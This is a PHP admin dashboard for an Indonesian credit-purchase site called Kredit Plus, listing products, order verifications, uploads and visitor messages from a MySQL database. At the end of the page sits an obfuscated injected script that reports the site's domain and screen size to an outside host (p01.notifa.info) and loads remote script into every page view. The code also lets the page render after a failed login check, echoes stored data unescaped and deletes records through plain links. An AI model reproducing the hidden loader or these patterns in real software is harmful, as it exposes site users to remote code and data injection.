<?php
session_start();
include '../core/core.php';

if(!isset($_SESSION['username'])) {
  header("Location: ../admin/login.php?access_denied");
}
?>

<!DOCTYPE html>
<html lang="en" class="no-js">
<head>
  <meta charset="UTF-8" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <title>Kredit Plus - Mudah dan Cepat</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
  <meta name="description" content="Unique - Responsive vCard Template" />
  <meta name="keywords" content="vcard, resposnive, retina, resume, jquery, css3, bootstrap, Unique, portfolio" />
  <meta name="author" content="lmtheme" />
  <link rel="shortcut icon" href="favicon.ico">

  <link rel="stylesheet" href="../css/bootstrap.css" type="text/css">
  <link rel="stylesheet" href="../css/normalize.css" type="text/css">
  <link rel="stylesheet" href="../css/animate.css" type="text/css">
  <link rel="stylesheet" href="../css/transition-animations.css" type="text/css">
  <link rel="stylesheet" href="../css/jquery.mCustomScrollbar.min.css" type="text/css">
  <link rel="stylesheet" href="../css/owl.carousel.css" type="text/css">
  <link rel="stylesheet" href="../css/magnific-popup.css" type="text/css">
  <link rel="stylesheet" href="../css/main-red.css" type="text/css">

  <!-- This styles needs for demo -->
  <link rel="stylesheet" href="../preview/lmpixels-demo-panel.css" type="text/css">
  <!-- /This styles needs for demo -->

  <link rel="stylesheet" href="../admin/css/bootstrap.min.css">
  <link rel="stylesheet" href="../admin/css/icons.css">
  <link rel="stylesheet" href="../admin/css/icons.css">
  <script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
    (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
    m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','../../../../www.google-analytics.com/analytics.js','ga');

  ga('create', 'UA-96534204-1', 'auto');
  ga('send', 'pageview');

  </script>

  <script src="../js/jquery-2.1.3.min.js"></script>
  <script src="../js/modernizr.custom.js"></script>
</head>

<body>
  <!-- Loading animation -->
  <div class="preloader">
    <div class="preloader-animation">
      <div class="dot1"></div>
      <div class="dot2"></div>
    </div>
  </div>
  <!-- /Loading animation -->

  <div id="page" class="page">
    <!-- Header -->
    <header id="site_header" class="header mobile-menu-hide header-color-light">
      <div class="my-photo tilt-effect">
        <img src="../images/photo.png" alt="image">
      </div>

      <div class="site-title-block">
        <h1 class="site-title">Kredit Plus</h1>
      </div>

      <!-- Navigation -->
      <div class="site-nav">
        <!-- Main menu -->
        <ul id="nav" class="site-main-menu">
          <li>
            <a class="pt-trigger" href="#home" data-animation="21"><i class="menu-icon pe-7s-icon pe-7s-home"></i>Halaman Utama</a>
          </li>
          <li>
            <a class="pt-trigger" href="#verifikasi" data-animation="17"><i class="menu-icon pe-7s-icon pe-7s-info"></i>Verifikasi</a>
          </li>
          <li>
            <a class="pt-trigger" href="#transaksi" data-animation="17"><i class="menu-icon pe-7s-icon pe-7s-wallet"></i>Transaksi</a>
          </li>
          <li>
            <a class="pt-trigger" href="#barang" data-animation="17"><i class="menu-icon pe-7s-icon pe-7s-box1"></i>Barang</a>
          </li>
        </li>
        <li>
          <a class="pt-trigger" href="#pesan" data-animation="17"><i class="menu-icon pe-7s-chat pe-7s-info"></i>Saran dan Masukan</a>
        </li>
      </ul>
      <!-- /Main menu -->
    </div>
    <!-- Navigation -->
  </header>
  <!-- /Header -->

  <!-- Mobile Header -->
  <div class="mobile-header mobile-visible">
    <div class="mobile-logo-container">
      <div class="mobile-site-title">Kredit Barang</div>
    </div>

    <a class="menu-toggle mobile-visible">
      <i class="fa fa-bars"></i>
    </a>
  </div>
  <!-- /Mobile Header -->

  <!-- Main Content -->
  <div id="main" class="site-main">
    <!-- Page changer wrapper -->
    <div class="pt-wrapper" style="background-image: url(../images/bg.png);">
      <!-- Subpages -->
      <div class="subpages">

        <!-- Home Subpage -->
        <section class="pt-page pt-page-1 section-without-bg section-paddings-0 table" data-id="home">
          <div class="section-inner">
            <div class="home-page-block">
              <h2>Kredit Barang</h2>
              <div class="owl-carousel text-rotation">
                <div class="item">
                  <p class="home-page-description">Ya disini...</p>
                </div>
                <div class="item">
                  <p class="home-page-description">Mudah dan Cepat</p>
                </div>
              </div>
            </div>
          </div>
        </section>
        <!-- End of Home Subpage -->

        <!-- About Me Subpage -->
        <section class="pt-page pt-page-2" data-id="barang">
          <div class="border-block-top-110"></div>
          <div class="section-inner">
            <div class="section-title-block">
              <div class="section-title-wrapper clearfix">
                <h2 class="section-title">Barang</h2>
                <h5 class="section-description">Informasi Barang</h5>
              </div>
            </div>

            <script type="text/javascript">
            $(document).ready(function() {
              $('#datatable').DataTable();

              //Buttons examples
              var table = $('#datatable-buttons').DataTable({
                lengthChange: false,
                searching: true,
                buttons: ['copy', 'pdf']
              });

              table.buttons().container()
              .appendTo('#datatable-buttons_wrapper .col-md-6:eq(0)');
            });
            </script>

            <div class="row">
              <!-- <div class="col-sm-6 col-md-6 col-lg-4 subpage-block">

            </div> -->

            <!-- <div class="col-sm-6 col-md-6 col-lg-4"> -->
            <!-- <div class="row"> -->
            <div class="col-12">
              <div class="card-box table-responsive">
                <a href="../admin/page-brg.php" class="pull-right btn btn-inverse ): ?>btn-sm waves-effect waves-light">Tambah Barang</a>
                <a href="../admin/page-ktg.php" class="pull-right btn btn-inverse ): ?>btn-sm waves-effect waves-light">Kategori</a>

                <table id="datatable-buttons" class="table table-striped table-bordered" cellspacing="0" width="100%">
                  <thead>
                    <tr>
                      <th>No</th>
                      <th>Nama</th>
                      <th>Harga</th>
                      <th>Kategori</th>
                      <th>Stok</th>
                      <th>Kode</th>
                      <th>Aksi</th>
                    </tr>
                  </thead>

                  <tbody>
                    <?php
                    $no=0;
                    $sql = "SELECT brg.*, kat.*, brg.id AS bid FROM barang AS brg JOIN kategori AS kat ON brg.kategori = kat.nama";
                    // $sql = "SELECT * FROM barang JOIN kategori ON barang.kategori = kategori.id";
                    // $sql = "SELECT * FROM barang";

                    $query = mysqli_query($connect, $sql);
                    if(!$query){
                      echo mysqli_error($connect);
                    }

                    while($data = mysqli_fetch_array($query)){
                      $no++;
                      ?>

                      <tr>

                      <td><?= $no ?></td>
                      <td><?= $data['nama_produk'] ?></td>
                      <td><?= number_format($data['harga']) ?></td>
                      <td><?= $data['nama'] ?></td>
                      <td><?= $data['stok'] ?></td>
                      <td><?= $data['kode_barang'] ?></td>

                      <td>
                        <a href="page-edit-brg.php?id=<?= $data['id']?>" class="btn"><i class="menu-icon pe-7s-icon pe-7s-edit"></i></a>
                        <a href="delete-brg.php?id=<?= $data['id']?>" class="btn"><i class="menu-icon pe-7s-icon pe-7s-junk"></i></a>
                      </td>

                      </tr>
                    <?php } ?>
                  </tbody>

                </td>
              </tr>
            </tfoot>
          </table>

        </div>
      </div>
      <!-- </div> -->
      <!-- end row -->
    </section>
    <!-- End of About Me Subpage -->

    <!-- About Me Subpage -->
    <section class="pt-page pt-page-2" data-id="verifikasi">
      <div class="border-block-top-110"></div>
      <div class="section-inner">
        <div class="section-title-block">
          <div class="section-title-wrapper clearfix">
            <h2 class="section-title">Verifikasi</h2>
            <h5 class="section-description">Verifikasi Barang</h5>
          </div>
        </div>

        <script type="text/javascript">
        $(document).ready(function() {
          $('#datatable2').DataTable();

          //Buttons examples
          var table = $('#datatable2-buttons').DataTable({
            lengthChange: false,
            searching: true,
            buttons: ['copy', 'pdf']
          });

          table.buttons().container()
          .appendTo('#datatable2-buttons_wrapper .col-md-6:eq(0)');
        });
        </script>

        <div class="row">

          <div class="col-12">
            <div class="card-box table-responsive">
              <img src="" alt="">
              <table id="datatable2-buttons" class="table table-striped table-bordered" cellspacing="0" width="100%">
                <?php if(isset($_GET['status'])): ?>
                  <p>
                    <?php
                    if($_GET['status'] == 'sukses'){
                      echo "Tambah data baru berhasil!";
                    } else {
                      echo "Tambah data gagal!";
                    }
                    ?>
                  </p>
                <?php endif; ?>
                <thead>

                  <tr>
                    <th>No</th>
                    <th>Nama</th>
                    <th>Nama Produk</th>
                    <th>Status</th>
                    <th>Aksi</th>
                  </tr>
                </thead>

                <tbody>
                  <?php
                  $no=0;
                  $sql = "SELECT * FROM verifikasi";
                  $query = mysqli_query($connect, $sql);

                  while($data = mysqli_fetch_array($query)){
                    $no++;
                    $status = $data['status'];
                    ?>
                    <tr>
                      <td><?= $no ?></td>
                      <td><?= $data['nama'] ?></td>
                      <td><?= $data['nama_produk'] ?></td>
                      <td><?= $data['status'] ?></td>
                      <td>
                        <form  action="../admin/terima-pesanan.php" method="post">
                          <input type="hidden" name="id" value="<?= $data['id'] ?>">
                          <input type="submit" name="tr" value="Ya"></i>
                        </form>
                        <form  action="../admin/tolak-pesanan.php" method="post">
                          <input type="hidden" name="id" value="<?= $data['id'] ?>">
                          <input type="submit" name="tk" value="Tidak">
                        </form>
                      </td>
                    </tr>
                  <?php } ?>
                </tbody>

              </td>
            </tr>
          </tfoot>
        </table>

      </div>
    </div>
    <!-- </div> -->
    <!-- end row -->
  </section>
  <!-- End of About Me Subpage -->

  <!-- About Me Subpage -->
  <section class="pt-page pt-page-2" data-id="transaksi">
    <div class="border-block-top-110"></div>
    <div class="section-inner">
      <div class="section-title-block">
        <div class="section-title-wrapper clearfix">
          <h2 class="section-title">Barang</h2>
          <h5 class="section-description">Informasi Barang</h5>
        </div>
      </div>

      <script type="text/javascript">
      $(document).ready(function() {
        $('#datatable3').DataTable();

        //Buttons examples
        var table = $('#datatable3-buttons').DataTable({
          lengthChange: false,
          searching: true,
          buttons: ['copy', 'pdf']
        });

        table.buttons().container()
        .appendTo('#datatable3-buttons_wrapper .col-md-6:eq(0)');
      });
      </script>

      <div class="row">
        <!-- <div class="col-sm-6 col-md-6 col-lg-4 subpage-block">

      </div> -->

      <!-- <div class="col-sm-6 col-md-6 col-lg-4"> -->
      <!-- <div class="row"> -->
      <div class="col-12">
        <div class="card-box table-responsive">
          <!-- <a href="../admin/page-tr.php" class="pull-right btn btn-inverse ): ?>btn-sm waves-effect waves-light">Tambah</a> -->
          <!-- <a href="../admin/page-brg.php" class="pull-right btn btn-inverse ): ?>btn-sm waves-effect waves-light">Tambah Barang</a>
          <a href="../admin/page-ktg.php" class="pull-right btn btn-inverse ): ?>btn-sm waves-effect waves-light">Kategori</a> -->

          <table id="datatable3-buttons" class="table table-striped table-bordered" cellspacing="0" width="100%">
            <?php if(isset($_GET['nama_file'])): ?>
              <p>
                <?php
                if($_GET['nama_file'] == 'sukses'){
                  echo "Tambah data baru berhasil!";
                } else {
                  echo "Tambah data gagal!";
                }
                ?>
              </p>
            <?php endif; ?>
            <thead>
              <tr>
                <th>No</th>
                <th>Nama</th>
                <!-- <th>Deskripsi</th> -->
                <th>Tgl Upload</th>
                <th>Hits</th>
                <!-- <th>Aksi</th> -->
              </tr>
            </thead>

            <tbody>
              <?php
              $no=0;
              $sql = "SELECT * FROM upload";
              $query = mysqli_query($connect, $sql);

              while($data = mysqli_fetch_array($query)){
                $no++;
                $status = $data['nama_file'];
                ?>
                <tr>
                  <td><?= $no ?></td>
                  <td><?= $data['nama_file'] ?></td>
                  <!-- <td><?= $data['deskripsi'] ?></td> -->
                  <td><?= $data['tgl_upload'] ?></td>
                  <td><?= $data['hits'] ?></td>
                  <!-- <td> -->
                    <!-- <?php echo "<a href=\"../images/upload/?file=$data[nama_file]\">Download File</a>"; ?> -->
                  <!-- </td> -->
                </tr>
              <?php } ?>
            </tbody>

          </td>
        </tr>
      </tfoot>
    </table>

  </div>
</div>
<!-- </div> -->
<!-- end row -->
</section>
<!-- End of About Me Subpage -->


  <!-- About Me Subpage -->
  <section class="pt-page pt-page-2" data-id="pesan">
    <div class="border-block-top-110"></div>
    <div class="section-inner">
      <div class="section-title-block">
        <div class="section-title-wrapper clearfix">
          <h2 class="section-title">Pesan</h2>
          <h5 class="section-description">Pesan Masuk</h5>
        </div>
      </div>

      <div class="row">

        <?php
        $no=0;
        $sql = "SELECT * FROM pesan";
        $query = mysqli_query($connect, $sql);

        while($data = mysqli_fetch_array($query)){
          $no++;
          $pesan = $data['name'];

          // jika data yang di-edit tidak ditemukan

          ?>

          <div class='col-sm-6 col-md-6 col-lg-4'>
           <div class='timeline-event te-primar'>

           <h5 class='event-date'><?= $no ?></h5>
           <h4 class='event-name'><?= $data['name'] ?></h4>
           <span class='event-description'><?=$data['email'] ?></span>
           <p><?= $data['message'] ?></p>
             <a href="delete-psn.php?id=<?= $data['id']?> ">Hapus</a>
           </br>
          </div>
          </div>

        <?php }
        ?>
      </div>
      <!-- End of Services block -->
    </div>
  </section>
  <!-- End of About Me Subpage -->

  <!-- </div> -->
</div>
<!-- /Page changer wrapper -->
</div>
<!-- /Main Content -->
</div>

<!-- Demo Color changer -->
<a id="lm_demo_panel_switcher" class="lm-demo-panel-switcher right"><i class="fa fa-gear"></i></a>
<div id="lm_demo_panel" class="lm-demo-panel right panel-color-red active">
  <div class="demo-panel-title">Selamat datang!</div>
  <div class="demo-panel-title">
    <?php echo $_SESSION['username']; ?></div>

    <a href="../admin/logout.php" class="layout-switcher" data-id="layout-menu-bottom">
      <div class="preview layout bottom">Keluar</div>
    </a>
    <a href="../admin/register.php" class="t-style-switcher current-t-style" data-id="template-style-dark">
      <div class="preview t-style t-style-dark">Tambah</div>
    </a>
    <a href="../admin/page-hapus-admin.php" class="t-style-switcher current-t-style" data-id="template-style-dark">
      <div class="preview t-style t-style-dark">Hapus</div>
    </a>
    </div>

  </div>

  <!-- Required datatable js -->
  <script src="../plugins/datatables/jquery.dataTables.min.js"></script>
  <script src="../plugins/datatables/dataTables.bootstrap4.min.js"></script>
  <!-- Buttons examples -->
  <script src="../plugins/datatables/dataTables.buttons.min.js"></script>
  <script src="../plugins/datatables/buttons.bootstrap4.min.js"></script>
  <script src="../plugins/datatables/jszip.min.js"></script>
  <script src="../plugins/datatables/pdfmake.min.js"></script>
  <script src="../plugins/datatables/vfs_fonts.js"></script>
  <script src="../plugins/datatables/buttons.html5.min.js"></script>
  <script src="../plugins/datatables/buttons.print.min.js"></script>
  <script src="../plugins/datatables/buttons.colVis.min.js"></script>
  <!-- Responsive examples -->
  <script src="../plugins/datatables/dataTables.responsive.min.js"></script>
  <script src="../plugins/datatables/responsive.bootstrap4.min.js"></script>


  <!-- /Demo Color changer -->
  <script src="../js/bootstrap.min.js"></script>
  <script src="../js/pages-switcher.js"></script>
  <script src="../js/imagesloaded.pkgd.min.js"></script>
  <script src="../js/validator.js"></script>
  <script src="../js/jquery.shuffle.min.js"></script>
  <script src="../js/masonry.pkgd.min.js"></script>
  <script src="../js/owl.carousel.min.js"></script>
  <script src="../js/jquery.magnific-popup.min.js"></script>
  <script src="../js/jquery.mCustomScrollbar.concat.min.js"></script>
  <script src="../js/tilt.jquery.min.js"></script>
  <script src="../js/jquery.hoverdir.js"></script>
  <script src="../js/main.js"></script>

  <!-- Demo Color changer Script -->
  <script src="../preview/lmpixels-demo-panel.js"></script>
  <!-- /Demo Color changer Script -->
  <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + 4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5mVa2K%2bNZnlpTXt9YnUCwpMMLx%2b%2bQHkmE4Wy7RkeBZJGKiJdue9wKB96Kc9iVjivRBFiEw44gPLCtvAbDqY8nlaWKojwq%2bGxts8680ZPIfGcjWoyu1MUIXmG%2b%2fgsc13iDQgNwbvkNzcl%2bgd5G365lc%2fZW9uzrhiAfXhLg0uTMRKGTIzWdvXQ%2b2shx1gs2blnB4W4WGsbJHO22nvyZ74GuIWsH%2bO2iD4UoLHdXpJvcTociFcQK9Dknfvs75H62QFe%2beG0uJJQHQwmanVfeImrn9vjTJrTMhkA6wmV23gTia4rlkd3WVk8bxtQmNtzP7ShU8RCESFWt%2fukSnHOF4HDXptKLmwTZA9k3nw9r0f7sEgrU0Xm8tcUqpgT%2bA3GpgWz0UZBVqoJQUQTafmPPjQfmo%2bujydoTzM%2b4kN2bVShERlJYGTwQiruBjPg4Jcq2vXsOMrY%2ftUBTyzxtnHSs6iYj1qOwVzMd4cpc%2fzRYJcQyAnBMqdxTgyoUr5ibFUVuN0qJG%2bXplJfh1lkgP45Ezt%2b7MOHgoActEOLtw + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script>
</body>
</html>
